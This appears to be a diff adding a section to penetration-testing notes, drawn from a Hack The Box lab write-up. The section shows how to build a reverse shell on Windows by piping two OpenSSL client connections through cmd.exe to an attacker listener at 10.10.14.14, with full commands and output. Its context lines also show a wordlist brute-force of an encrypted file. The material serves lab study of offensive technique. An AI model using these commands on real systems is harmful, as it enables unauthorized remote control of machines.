@@ -61,3 +61,69 @@ Alternatively, we can use [openssl-bruteforce](https://github.com/HrushikeshK/op
 python openssl-bruteforce/brute.py /usr/share/wordlists/rockyou.txt  openssl-bruteforce/ciphers.txt .drupal.txt.enc 2> /dev/null
 ```
 
+# Shell via OpenSSL
+
+The information in this section is from [0xdf HTB: Ethereal writeup](https://0xdf.gitlab.io/2019/03/09/htb-ethereal.html#shell-via-openssl).
+
+First, generate an SSL certificate:
+
+```sh
+root@kali# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes                                                                                    
+Generating a RSA private key
+.................................................................................................................................++++                                                                                      
+..................................++++
+writing new private key to 'key.pem'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+
+root@kali# ls *.pem
+cert.pem  key.pem
+```
+
+Then test the connection to the remote service. In this case I'm using Windows based system:
+
+```sh
+quiet ( echo "test" | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73 )
+```
+
+Now from the attacker machine we should have a listener to receive the output:
+
+```sh
+root@kali# openssl s_server -quiet -key key.pem -cert cert.pem  -port 73
+"test"
+```
+
+We can create a shell by using two openssl calls, one will be piping the output into cmd and the output of that piped into the other. We can type commands into one connection and get results back on the other.
+
+
+We’ll start two openssl services just as above, and then on Windows:
+
+```sh
+quiet start cmd /c "c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:73 | cmd.exe | c:\progra~2\openss~1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.14:136"
+```
+
+The `start` is essential here as it opens this in a new process so that it stays running after the web request times out.
+
+The listener on port 73 doesn’t print anything but on port 136, we should receive the shell:
+
+```
+root@kali# openssl s_server -quiet -key key.pem -cert cert.pem  -port 136
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>
+```
+
